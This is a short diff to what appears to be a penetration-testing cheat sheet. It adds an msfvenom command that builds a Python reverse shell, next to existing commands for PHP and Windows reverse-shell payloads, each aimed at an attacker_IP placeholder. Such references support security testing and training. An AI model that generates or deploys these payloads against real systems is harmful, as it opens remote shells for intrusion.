@@ -2282,6 +2282,9 @@ msfvenom -p php/reverse_php LHOST=attacker_IP LPORT=port_here -o shell.php
 
 # create reverse shell as python shellcode - Windows 32-bit (unstaged)
 msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP_here LPORT=port_here -f py -a x86
+
+# create python reverse shell
+msfvenom -p python/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -o shell.py
 ```
 
 
